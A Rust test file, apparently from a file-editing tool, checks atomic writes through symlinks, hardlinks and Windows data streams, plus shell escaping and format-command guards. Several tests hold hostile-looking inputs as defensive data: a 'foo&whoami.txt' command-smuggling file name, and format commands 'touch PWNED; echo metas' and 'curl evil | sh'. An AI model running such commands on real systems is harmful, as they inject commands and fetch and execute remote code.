        let input = "\u{a0}a\n\n\u{3000} b\n   c\n";
        let out = dedent_content(input, "auto", None);
        assert_eq!(out.lines().count(), input.lines().count());
        for (got, want) in out.lines().zip(input.lines()) {
            assert_eq!(got.trim(), want.trim(), "content changed: {got:?}");
        }
    }
}

#[cfg(unix)]
mod symlink_handling {
    use super::*;

    #[test]
    fn atomic_write_through_symlink_preserves_symlink() {
        // #1230: atomic_write through a symlink should modify the target,
        // not replace the symlink with a regular file.
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("real.txt");
        fs::write(&target, "original content\n").unwrap();

        let link = dir.path().join("link.txt");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        let policy = WritePolicy::default();
        atomic_write(&link, "modified content\n", &policy).unwrap();

        // The symlink must still be a symlink.
        assert!(
            link.is_symlink(),
            "link.txt should still be a symlink after atomic_write"
        );
        // The target file must have the new content.
        let target_content = fs::read_to_string(&target).unwrap();
        assert_eq!(target_content, "modified content\n");
        // Reading through the symlink should also show the new content.
        let link_content = fs::read_to_string(&link).unwrap();
        assert_eq!(link_content, "modified content\n");
    }

    #[test]
    fn atomic_write_through_symlink_chain() {
        // Symlink chain: link2 -> link1 -> real.txt
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("real.txt");
        fs::write(&target, "deep target\n").unwrap();

        let link1 = dir.path().join("link1.txt");
        std::os::unix::fs::symlink(&target, &link1).unwrap();
        let link2 = dir.path().join("link2.txt");
        std::os::unix::fs::symlink(&link1, &link2).unwrap();

        let policy = WritePolicy::default();
        atomic_write(&link2, "chain modified\n", &policy).unwrap();

        assert!(link2.is_symlink(), "link2 should still be a symlink");
        assert!(link1.is_symlink(), "link1 should still be a symlink");
        assert_eq!(fs::read_to_string(&target).unwrap(), "chain modified\n");
    }

    #[test]
    fn atomic_write_replaces_dangling_symlink_with_regular_file() {
        // Dangling symlink cannot write-through. Force-create / overwrite must
        // replace the broken link entry with a regular file (agent recreate
        // after bad rename). Live symlinks still write through (#1230).
        let dir = tempfile::tempdir().unwrap();
        let link = dir.path().join("dangling.txt");
        std::os::unix::fs::symlink(dir.path().join("nonexistent.txt"), &link).unwrap();

        let policy = WritePolicy::default();
        atomic_write(&link, "content\n", &policy).unwrap();
        assert!(link.is_file());
        assert!(!link.symlink_metadata().unwrap().file_type().is_symlink());
        assert_eq!(fs::read_to_string(&link).unwrap(), "content\n");
    }

    #[test]
    fn atomic_write_through_symlink_preserves_target_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("real.txt");
        fs::write(&target, "original\n").unwrap();
        let perms = std::fs::Permissions::from_mode(0o755);
        std::fs::set_permissions(&target, perms).unwrap();

        let link = dir.path().join("link.txt");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        let policy = WritePolicy::default();
        atomic_write(&link, "modified\n", &policy).unwrap();

        let meta = std::fs::metadata(&target).unwrap();
        assert_eq!(meta.permissions().mode() & 0o777, 0o755);
    }
}

#[cfg(windows)]
fn windows_short_path(path: &std::path::Path) -> Option<std::path::PathBuf> {
    let output = std::process::Command::new("powershell")
        .env("PATCHLOOM_LONG", path)
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "$ErrorActionPreference='Stop'; (New-Object -ComObject Scripting.FileSystemObject).GetFile($env:PATCHLOOM_LONG).ShortPath",
        ])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let s = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if s.is_empty() {
        return None;
    }
    let p = std::path::PathBuf::from(s);
    let leaf = p.file_name()?.to_string_lossy();
    if !leaf.contains('~') {
        return None;
    }
    Some(p)
}

/// Replace via the 8.3 name must keep the long directory entry.
#[cfg(windows)]
#[test]
fn atomic_write_via_8dot3_keeps_long_name() {
    let dir = tempfile::tempdir().unwrap();
    let long = dir.path().join("LongFileName.txt");
    fs::write(&long, "old\n").unwrap();
    let Some(short) = windows_short_path(&long) else {
        eprintln!("skip 8.3: volume has short names disabled");
        return;
    };
    atomic_write(&short, "new\n", &WritePolicy::default()).unwrap();
    assert!(
        long.is_file(),
        "long name must remain after write via {}",
        short.display()
    );
    assert_eq!(fs::read_to_string(&long).unwrap(), "new\n");
    assert_eq!(fs::read_to_string(&short).unwrap(), "new\n");
    let names: Vec<_> = fs::read_dir(dir.path())
        .unwrap()
        .filter_map(|e| e.ok())
        .map(|e| e.file_name())
        .collect();
    assert_eq!(
        names.len(),
        1,
        "must not create a second short-name entry: {names:?}"
    );
}

#[test]
fn parse_stream_name_lines_skips_default_data() {
    assert_eq!(
        super::parse_stream_name_lines(":$DATA\r\ncustom\r\nZone.Identifier\r\n"),
        ["custom", "Zone.Identifier"]
    );
}

/// Temp+rename persist must keep Mark of the Web (fixrealloop R123).
#[cfg(windows)]
#[test]
fn atomic_write_keeps_zone_identifier() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("dl.txt");
    fs::write(&target, "old\n").unwrap();
    let motw = b"[ZoneTransfer]\r\nZoneId=3\r\n";
    fs::write(super::windows_stream_path(&target, "Zone.Identifier"), motw).unwrap();

    atomic_write(&target, "new\n", &WritePolicy::default()).unwrap();

    assert_eq!(fs::read_to_string(&target).unwrap(), "new\n");
    assert_eq!(
        fs::read(super::windows_stream_path(&target, "Zone.Identifier")).unwrap(),
        motw,
        "MOTW must survive temp+rename persist"
    );
}

/// Custom ADS must survive the same persist path as MOTW (#2341).
#[cfg(windows)]
#[test]
fn atomic_write_keeps_custom_named_stream() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("ads.txt");
    fs::write(&target, "old\n").unwrap();
    let custom = b"secret";
    let motw = b"[ZoneTransfer]\r\nZoneId=3\r\n";
    fs::write(super::windows_stream_path(&target, "custom"), custom).unwrap();
    fs::write(super::windows_stream_path(&target, "Zone.Identifier"), motw).unwrap();

    atomic_write(&target, "new\n", &WritePolicy::default()).unwrap();

    assert_eq!(fs::read_to_string(&target).unwrap(), "new\n");
    assert_eq!(
        fs::read(super::windows_stream_path(&target, "custom")).unwrap(),
        custom,
        "custom named stream must survive temp+rename persist"
    );
    assert_eq!(
        fs::read(super::windows_stream_path(&target, "Zone.Identifier")).unwrap(),
        motw,
        "MOTW must still survive when a custom stream is also present"
    );
}

/// Dest names with `&` must not be extra `cmd /C` commands (#2356 review).
#[cfg(windows)]
#[test]
fn atomic_write_keeps_custom_stream_when_dest_name_has_ampersand() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("foo&whoami.txt");
    fs::write(&target, "old\n").unwrap();
    let custom = b"secret";
    fs::write(super::windows_stream_path(&target, "custom"), custom).unwrap();

    atomic_write(&target, "new\n", &WritePolicy::default()).unwrap();

    assert_eq!(fs::read_to_string(&target).unwrap(), "new\n");
    assert_eq!(
        fs::read(super::windows_stream_path(&target, "custom")).unwrap(),
        custom,
        "custom stream must survive a dest name that cmd would split on"
    );
}

/// Hidden dests are skipped by bare `dir /R`; `/A` must still list them.
#[cfg(windows)]
#[test]
fn atomic_write_keeps_custom_stream_on_hidden_dest() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("hidden.txt");
    fs::write(&target, "old\n").unwrap();
    let custom = b"secret";
    fs::write(super::windows_stream_path(&target, "custom"), custom).unwrap();
    let _ = std::process::Command::new("attrib")
        .args(["+H"])
        .arg(&target)
        .status();

    let result = atomic_write(&target, "new\n", &WritePolicy::default());
    let _ = std::process::Command::new("attrib")
        .args(["-H"])
        .arg(&target)
        .status();
    result.unwrap();

    assert_eq!(fs::read_to_string(&target).unwrap(), "new\n");
    assert_eq!(
        fs::read(super::windows_stream_path(&target, "custom")).unwrap(),
        custom,
        "custom stream must survive persist of a Hidden dest"
    );
}

/// A file with no named streams must not grow a Zone.Identifier.
#[cfg(windows)]
#[test]
fn atomic_write_without_ads_does_not_invent_motw() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("plain.txt");
    fs::write(&target, "old\n").unwrap();
    atomic_write(&target, "new\n", &WritePolicy::default()).unwrap();
    assert_eq!(fs::read_to_string(&target).unwrap(), "new\n");
    assert!(
        fs::read(super::windows_stream_path(&target, "Zone.Identifier")).is_err(),
        "must not invent MOTW on a file that had none"
    );
}

/// Readonly dest + MOTW: stream copy must not run after set_permissions
/// on the tempfile. Persist still fails (FILE_ATTRIBUTE_READONLY); dest
/// bytes and MOTW stay.
#[cfg(windows)]
#[test]
fn atomic_write_readonly_with_motw_leaves_dest() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("ro.txt");
    fs::write(&target, "old\n").unwrap();
    let motw = b"[ZoneTransfer]\r\nZoneId=3\r\n";
    fs::write(super::windows_stream_path(&target, "Zone.Identifier"), motw).unwrap();
    let mut perms = fs::metadata(&target).unwrap().permissions();
    perms.set_readonly(true);
    fs::set_permissions(&target, perms).unwrap();

    let err = atomic_write(&target, "new\n", &WritePolicy::default()).unwrap_err();
    let msg = format!("{err:#}");
    assert!(
        fs::read_to_string(&target).unwrap() == "old\n",
        "readonly dest must keep original bytes: {msg}"
    );
    assert_eq!(
        fs::read(super::windows_stream_path(&target, "Zone.Identifier")).unwrap(),
        motw,
        "MOTW must remain when persist cannot replace dest: {msg}"
    );

    let _ = std::process::Command::new("attrib")
        .args(["-R"])
        .arg(&target)
        .status();
}

/// Create a dest past MAX_PATH without `\\?\` must persist (fixrealloop R125).
#[cfg(windows)]
#[test]
fn atomic_create_new_long_path_without_verbatim_prefix() {
    let dir = tempfile::tempdir().unwrap();
    let dest = dir.path().join(format!("{}.txt", "L".repeat(240)));
    assert!(
        dest.to_string_lossy().len() >= 248,
        "fixture must exceed the persist_dest budget: {}",
        dest.to_string_lossy().len()
    );
    atomic_create_new(&dest, "hi\n", &WritePolicy::default()).unwrap();
    let verbatim = std::path::PathBuf::from(format!(r"\\?\{}", dest.display()));
    assert_eq!(fs::read_to_string(&verbatim).unwrap(), "hi\n");
}

/// Sibling hardlink must observe Apply bytes on every OS that reports
/// `nlink > 1`. Live-red on Windows when the check was `#[cfg(unix)]`
/// only (fixrealloop R93).
#[test]
fn atomic_write_preserves_hardlink_sibling_content() {
    let dir = tempfile::tempdir().unwrap();
    let a = dir.path().join("a.txt");
    let b = dir.path().join("b.txt");
    fs::write(&a, "shared\n").unwrap();
    fs::hard_link(&a, &b).unwrap();

    atomic_write(&a, "changed\n", &WritePolicy::default()).unwrap();

    assert_eq!(fs::read_to_string(&a).unwrap(), "changed\n");
    assert_eq!(
        fs::read_to_string(&b).unwrap(),
        "changed\n",
        "sibling hardlink must see the new content"
    );
}

/// Hardlink-preserving writes (#1733): multi-linked files keep a shared inode.
#[cfg(unix)]
mod hardlink_handling {
    use super::*;
    use std::os::unix::fs::MetadataExt;

    #[test]
    fn atomic_write_preserves_hardlinks() {
        let dir = tempfile::tempdir().unwrap();
        let a = dir.path().join("a.txt");
        let b = dir.path().join("b.txt");
        fs::write(&a, "shared\n").unwrap();
        fs::hard_link(&a, &b).unwrap();

        let before_ino = fs::metadata(&a).unwrap().ino();
        assert_eq!(fs::metadata(&a).unwrap().nlink(), 2);
        assert_eq!(fs::metadata(&b).unwrap().ino(), before_ino);

        let policy = WritePolicy::default();
        atomic_write(&a, "changed\n", &policy).unwrap();

        assert_eq!(fs::read_to_string(&a).unwrap(), "changed\n");
        assert_eq!(
            fs::read_to_string(&b).unwrap(),
            "changed\n",
            "sibling hardlink must see the new content"
        );
        let after_a = fs::metadata(&a).unwrap();
        let after_b = fs::metadata(&b).unwrap();
        assert_eq!(after_a.ino(), before_ino, "inode must be preserved");
        assert_eq!(
            after_b.ino(),
            before_ino,
            "siblings must share the same inode"
        );
        assert!(
            after_a.nlink() > 1,
            "nlink must stay > 1 after write, got {}",
            after_a.nlink()
        );
    }

    #[test]
    fn atomic_write_single_link_still_uses_rename_path() {
        // Single-link files should not take the hardlink-preserving branch.
        // Rename (temp+persist) replaces the directory entry with a new inode;
        // open+truncate would keep the same inode. nlink alone does not prove
        // which branch ran (both leave nlink == 1).
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("solo.txt");
        fs::write(&path, "before\n").unwrap();
        assert_eq!(fs::metadata(&path).unwrap().nlink(), 1);
        let before_ino = fs::metadata(&path).unwrap().ino();

        let policy = WritePolicy::default();
        atomic_write(&path, "after\n", &policy).unwrap();

        assert_eq!(fs::read_to_string(&path).unwrap(), "after\n");
        assert_eq!(
            fs::metadata(&path).unwrap().nlink(),
            1,
            "single-link file must remain nlink == 1"
        );
        assert_ne!(
            fs::metadata(&path).unwrap().ino(),
            before_ino,
            "rename path must install a new inode (open+write would preserve ino)"
        );
    }

    #[test]
    fn atomic_write_through_symlink_to_hardlinked_target() {
        // Compose #1230 + #1733: symlink → multi-hardlinked regular file.
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("real.txt");
        let sibling = dir.path().join("sibling.txt");
        fs::write(&target, "shared\n").unwrap();
        fs::hard_link(&target, &sibling).unwrap();

        let link = dir.path().join("link.txt");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        let before_ino = fs::metadata(&target).unwrap().ino();
        let policy = WritePolicy::default();
        atomic_write(&link, "via-link\n", &policy).unwrap();

        assert!(link.is_symlink(), "symlink entry must remain a symlink");
        assert_eq!(fs::read_to_string(&target).unwrap(), "via-link\n");
        assert_eq!(
            fs::read_to_string(&sibling).unwrap(),
            "via-link\n",
            "hardlink sibling of symlink target must update"
        );
        assert_eq!(fs::metadata(&target).unwrap().ino(), before_ino);
        assert_eq!(fs::metadata(&sibling).unwrap().ino(), before_ino);
        assert!(fs::metadata(&target).unwrap().nlink() > 1);
    }

    #[test]
    fn atomic_write_preserves_hardlink_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let a = dir.path().join("a.txt");
        let b = dir.path().join("b.txt");
        fs::write(&a, "shared\n").unwrap();
        fs::hard_link(&a, &b).unwrap();
        std::fs::set_permissions(&a, std::fs::Permissions::from_mode(0o640)).unwrap();

        let policy = WritePolicy::default();
        atomic_write(&a, "changed\n", &policy).unwrap();

        let mode = fs::metadata(&a).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o640,
            "permissions must be restored on the shared inode"
        );
        assert_eq!(fs::read_to_string(&b).unwrap(), "changed\n");
    }

    #[test]
    fn atomic_write_hardlinks_applies_write_policy() {
        let dir = tempfile::tempdir().unwrap();
        let a = dir.path().join("a.txt");
        let b = dir.path().join("b.txt");
        fs::write(&a, "line  \n").unwrap();
        fs::hard_link(&a, &b).unwrap();

        let policy = WritePolicy {
            trim_trailing_whitespace: true,
            ensure_final_newline: true,
            ..WritePolicy::default()
        };
        atomic_write(&a, "line  ", &policy).unwrap();

        assert_eq!(fs::read_to_string(&a).unwrap(), "line\n");
        assert_eq!(fs::read_to_string(&b).unwrap(), "line\n");
        assert!(fs::metadata(&a).unwrap().nlink() > 1);
    }

    #[test]
    fn atomic_write_hardlink_readonly_errors_with_path() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let a = dir.path().join("a.txt");
        let b = dir.path().join("b.txt");
        fs::write(&a, "shared\n").unwrap();
        fs::hard_link(&a, &b).unwrap();
        fs::set_permissions(&a, fs::Permissions::from_mode(0o444)).unwrap();
        // Root (common in Docker) can still write mode-444 files. Skip when
        // permissions do not actually block writing. Probe without truncate so
        // we never clobber content if the open succeeds.
        if fs::OpenOptions::new().write(true).open(&a).is_ok() {
            let _ = fs::set_permissions(&a, fs::Permissions::from_mode(0o644));
            return;
        }

        let policy = WritePolicy::default();
        let err = atomic_write(&a, "changed\n", &policy).unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("hardlinked") && msg.contains("a.txt"),
            "readonly hardlink error must name the path and hardlink path: {msg}"
        );
        // Sibling must still hold original content (failed open before truncate).
        let _ = fs::set_permissions(&a, fs::Permissions::from_mode(0o644));
        assert_eq!(fs::read_to_string(&b).unwrap(), "shared\n");
    }
}

mod error_handling {
    use super::*;

    #[test]
    fn atomic_create_new_fails_if_exists() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("existing.txt");
        fs::write(&target, "old").unwrap();

        let policy = WritePolicy::default();
        let err = atomic_create_new(&target, "new", &policy).unwrap_err();
        assert!(
            err.to_string().contains("already exists"),
            "error should mention 'already exists': {err}"
        );
        assert!(
            crate::exit::is_already_exists(&err),
            "create race must be typed AlreadyExistsError for JSON error_kind"
        );
    }

    #[test]
    fn write_policy_override_invalid_normalize_eol() {
        let mut policy = WritePolicy::default();
        let ov = WritePolicyOverride {
            normalize_eol: Some("invalid".to_string()),
            ..Default::default()
        };
        let err = policy.apply_override(&ov).unwrap_err();
        assert!(
            err.to_string().contains("invalid normalize_eol value"),
            "expected invalid eol error, got: {err}"
        );
        assert!(
            crate::exit::is_invalid_input(&err),
            "invalid normalize_eol must be typed InvalidInputError for JSON error_kind"
        );
        // Policy should not have been partially mutated before the error.
        assert!(matches!(policy.normalize_eol, EolMode::Keep));
    }
}

#[cfg(feature = "cli")]
mod shell_escape_tests {
    use super::*;

    #[test]
    fn simple_path_unchanged() {
        assert_eq!(shell_escape("src/main.rs"), "src/main.rs");
    }

    #[test]
    fn path_with_spaces_is_quoted() {
        #[cfg(not(windows))]
        assert_eq!(shell_escape("src/my file.rs"), "'src/my file.rs'");
        #[cfg(windows)]
        assert_eq!(shell_escape("src/my file.rs"), "\"src/my file.rs\"");
    }

    #[test]
    #[cfg(not(windows))]
    fn path_with_single_quote_is_escaped() {
        assert_eq!(shell_escape("it's a file.rs"), "'it'\\''s a file.rs'");
    }

    #[test]
    #[cfg(windows)]
    fn path_with_double_quote_is_escaped() {
        assert_eq!(shell_escape("a\"b.rs"), "\"a\"\"b.rs\"");
    }

    #[test]
    fn dots_underscores_hyphens_slashes_safe() {
        assert_eq!(shell_escape("a-b_c.d/e"), "a-b_c.d/e");
    }

    #[test]
    #[cfg(windows)]
    fn backslash_path_separator_is_safe() {
        assert_eq!(shell_escape("src\\main.rs"), "src\\main.rs");
    }
}

#[cfg(feature = "cli")]
mod format_command_tests {
    use super::*;

    #[test]
    fn no_format_flag_skips_formatting() {
        let dir = tempfile::tempdir().unwrap();
        let mut global = test_global_flags();
        global.format = Some("false".into()); // would fail if run
        global.no_format = true;
        // Should return Ok because no_format skips everything
        run_format_command(&global, dir.path()).unwrap();
    }

    #[test]
    fn explicit_format_failure_is_format_failed() {
        let dir = tempfile::tempdir().unwrap();
        let mut global = test_global_flags();
        global.format = Some("false".into());
        let err = run_format_command(&global, dir.path()).unwrap_err();
        assert!(
            crate::exit::is_format_failed(&err),
            "explicit --format failure must be FormatFailedError: {err}"
        );
        assert!(err.to_string().contains("format command failed"));
    }

    #[test]
    fn explicit_format_timeout_is_format_failed() {
        let dir = tempfile::tempdir().unwrap();
        let mut global = test_global_flags();
        global.format = Some("sleep 60".into());
        global.format_timeout = Some(1);
        let err = run_format_command(&global, dir.path()).unwrap_err();
        assert!(
            crate::exit::is_format_failed(&err),
            "format timeout must be FormatFailedError: {err}"
        );
        assert!(
            err.to_string().contains("timed out") || err.to_string().contains("format command"),
            "msg={err}"
        );
    }

    #[test]
    fn run_format_command_ext_no_format_skips() {
        let dir = tempfile::tempdir().unwrap();
        let mut global = test_global_flags();
        global.no_format = true;
        let config = crate::config::FormatConfig {
            auto: Some(true),
            command: Some("false".into()),
            ..Default::default()
        };
        // no_format should prevent all formatting
        run_format_command_ext(&global, dir.path(), None, Some(&config)).unwrap();
    }

    #[test]
    fn run_format_command_ext_auto_false_skips() {
        let dir = tempfile::tempdir().unwrap();
        let global = test_global_flags();
        let config = crate::config::FormatConfig {
            auto: Some(false),
            command: Some("false".into()),
            ..Default::default()
        };
        // auto=false means skip formatting when no explicit --format
        run_format_command_ext(&global, dir.path(), None, Some(&config)).unwrap();
    }

    #[test]
    fn run_format_command_ext_auto_none_skips() {
        let dir = tempfile::tempdir().unwrap();
        let global = test_global_flags();
        let config = crate::config::FormatConfig {
            auto: None,
            command: Some("false".into()),
            ..Default::default()
        };
        run_format_command_ext(&global, dir.path(), None, Some(&config)).unwrap();
    }

    #[test]
    fn run_format_command_ext_by_extension_runs_formatter() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("test.txt");
        std::fs::write(&file, "hello\n").unwrap();

        let global = test_global_flags();
        let mut by_ext = std::collections::HashMap::new();
        // Use "true" as a no-op formatter that always succeeds
        by_ext.insert("txt".to_string(), "true --".to_string());
        let config = crate::config::FormatConfig {
            auto: Some(true),
            command: None,
            by_extension: by_ext,
        };
        // Should succeed (formatter "true" exits 0)
        run_format_command_ext(&global, dir.path(), Some(&["test.txt"]), Some(&config)).unwrap();
    }

    #[test]
    fn run_format_command_ext_by_extension_no_match_skips() {
        let dir = tempfile::tempdir().unwrap();
        let global = test_global_flags();
        let mut by_ext = std::collections::HashMap::new();
        by_ext.insert("rs".to_string(), "false".to_string());
        let config = crate::config::FormatConfig {
            auto: Some(true),
            command: None,
            by_extension: by_ext,
        };
        // File has .txt extension, no formatter for .txt, should be a no-op
        run_format_command_ext(&global, dir.path(), Some(&["test.txt"]), Some(&config)).unwrap();
    }

    #[test]
    fn run_format_command_ext_formatter_failure_warns_not_bails() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("test.rs");
        std::fs::write(&file, "fn main() {}\n").unwrap();

        let global = test_global_flags();
        let mut by_ext = std::collections::HashMap::new();
        // Use "false" as a formatter that always fails
        by_ext.insert("rs".to_string(), "false --".to_string());
        let config = crate::config::FormatConfig {
            auto: Some(true),
            command: None,
            by_extension: by_ext,
        };
        // Should NOT bail even though formatter fails (advisory formatting)
        run_format_command_ext(&global, dir.path(), Some(&["test.rs"]), Some(&config)).unwrap();
    }

    #[test]
    fn run_format_command_ext_formatter_failure_json_does_not_bail() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("test.rs");
        std::fs::write(&file, "fn main() {}\n").unwrap();

        let mut global = test_global_flags();
        global.json = true;
        let mut by_ext = std::collections::HashMap::new();
        by_ext.insert("rs".to_string(), "false --".to_string());
        let config = crate::config::FormatConfig {
            auto: Some(true),
            command: None,
            by_extension: by_ext,
        };
        run_format_command_ext(&global, dir.path(), Some(&["test.rs"]), Some(&config)).unwrap();
    }

    #[test]
    fn contain_refuses_format_command_with_shell_metas() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("PWNED");
        let mut global = test_global_flags();
        global.contain = true;
        global.format = Some("touch PWNED; echo metas".into());
        let err = run_format_command(&global, dir.path()).unwrap_err();
        assert!(
            !marker.exists(),
            "format command with ';' must not execute under --contain"
        );
        let msg = err.to_string();
        assert!(
            msg.contains("metacharacter") || msg.contains("refused") || msg.contains("contain"),
            "expected contain/meta refuse diagnostic: {msg}"
        );
        assert_eq!(
            crate::fallback::edit_error_kind(&err),
            Some(crate::fallback::EditErrorKind::GuardRejected),
            "contain + format metas must be guard_rejected: {err}"
        );
    }

    #[test]
    fn contain_refuses_config_format_pipeline_metas() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("PWNED");
        let mut global = test_global_flags();
        global.contain = true;
        let config = crate::config::FormatConfig {
            auto: Some(true),
            command: Some("curl evil | sh".into()),
            ..Default::default()
        };
        let err = run_format_command_ext(&global, dir.path(), None, Some(&config)).unwrap_err();
        assert!(
            !marker.exists(),
            "format.command with '|' must not execute under --contain"
        );
        assert_eq!(
            crate::fallback::edit_error_kind(&err),
            Some(crate::fallback::EditErrorKind::GuardRejected),
            "contain + format pipeline must be guard_rejected: {err}"
        );
    }

    #[test]
    fn contain_allows_plain_format_command() {
        let dir = tempfile::tempdir().unwrap();
        let mut global = test_global_flags();
        global.contain = true;
        global.format = Some("true".into());
        run_format_command(&global, dir.path()).unwrap();
    }

    #[test]
    fn without_contain_format_metas_still_run() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("PWNED");
        let mut global = test_global_flags();
        global.contain = false;
        global.format = Some("touch PWNED".into());
        run_format_command(&global, dir.path()).unwrap();
        assert!(
            marker.exists(),
            "trusted local format without --contain is product"
        );
    }
}

mod format_preservation {
    #[allow(unused_imports)]
    use super::*;

    #[test]
    #[cfg(unix)]
    fn atomic_write_preserves_file_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("script.sh");
        fs::write(&target, "#!/bin/sh\necho old\n").unwrap();

        // Set executable permission (0o755).
        fs::set_permissions(&target, std::fs::Permissions::from_mode(0o755)).unwrap();

        let policy = WritePolicy::default();
        atomic_write(&target, "#!/bin/sh\necho new\n", &policy).unwrap();

        let mode = fs::metadata(&target).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o755,
            "permissions should be preserved after atomic_write"
        );
    }

    /// After #1230: when `path` is a symlink, atomic_write resolves it and
    /// writes to the target file. The symlink is preserved, the target gets
    /// new content, and the target's permissions are carried over (since we
    /// are writing to the actual target, not creating a new file at the
    /// symlink entry).
    #[test]
    #[cfg(unix)]
    fn atomic_write_symlink_writes_to_target_preserves_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("target.txt");
        fs::write(&target, "content").unwrap();
        fs::set_permissions(&target, std::fs::Permissions::from_mode(0o444)).unwrap();

        let link = dir.path().join("link.txt");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        let policy = WritePolicy::default();
        atomic_write(&link, "new content", &policy).unwrap();

        // The symlink must still be a symlink (#1230).
        assert!(link.symlink_metadata().unwrap().file_type().is_symlink());
        // The target file now has the new content.
        assert_eq!(fs::read_to_string(&target).unwrap(), "new content");
        // The target's original permissions are preserved.
        let mode = fs::metadata(&target).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o444,
            "target permissions should be preserved when writing through symlink"
        );
    }

    /// Regression: apply_override must validate all fields before mutating any.
    /// An invalid normalize_eol must not leave other fields partially applied.
    #[test]
    fn apply_override_invalid_eol_no_partial_mutation() {
        let mut policy = WritePolicy::default();
        assert!(!policy.ensure_final_newline);
        assert!(!policy.trim_trailing_whitespace);

        let ov = WritePolicyOverride {
            ensure_final_newline: Some(true),
            normalize_eol: Some("INVALID".into()),
            trim_trailing_whitespace: Some(true),
            collapse_blanks: Some(true),
            respect_editorconfig: None,
        };

        let result = policy.apply_override(&ov);
        assert!(result.is_err(), "invalid eol should produce an error");

        // All fields must remain at their defaults (no partial mutation).
        assert!(
            !policy.ensure_final_newline,
            "ensure_final_newline must not be mutated on error"
        );
        assert!(
            !policy.trim_trailing_whitespace,
            "trim_trailing_whitespace must not be mutated on error"
        );
        assert!(
            !policy.collapse_blanks,
            "collapse_blanks must not be mutated on error"
        );
    }

    /// Files created by `atomic_create_new` must have 0o644 permissions
    /// on Unix, not the restrictive 0o600 from NamedTempFile (#1161).
    #[cfg(unix)]
    #[test]
    fn atomic_create_new_permissions_644() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("new_file.txt");
        atomic_create_new(&path, "hello\n", &WritePolicy::default()).unwrap();
        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o644, "expected 0o644, got 0o{mode:o}");
    }

    /// WritePolicyOverride (plan serialization type) must accept unknown fields
    /// for forward compatibility. Plans from newer patchloom versions may include
    /// fields that older versions don't recognize. (#1353)
    #[test]
    fn write_policy_override_accepts_unknown_fields() {
        let json = r#"{
            "ensure_final_newline": true,
            "future_field_from_v2": "some_value",
            "another_future_bool": true
        }"#;
        let result: Result<WritePolicyOverride, _> = serde_json::from_str(json);
        assert!(
            result.is_ok(),
            "WritePolicyOverride should accept unknown fields for forward compat: {:?}",
            result.err()
        );
        let ov = result.unwrap();
        assert_eq!(ov.ensure_final_newline, Some(true));
    }

    /// WritePolicyOverride in a plan context must ignore unknown fields,
    /// allowing plans from newer patchloom versions to be parsed by older ones.
    #[test]
    fn plan_write_policy_forward_compat() {
        let json = r#"{
            "version": 1,
            "write_policy": {
                "ensure_final_newline": true,
                "some_future_feature": "value"
            },
            "operations": []
        }"#;
        let plan: crate::plan::Plan = serde_json::from_str(json)
            .expect("plan with unknown write_policy fields should parse successfully");
        let wp = plan.write_policy.unwrap();
        assert_eq!(wp.ensure_final_newline, Some(true));
    }
}
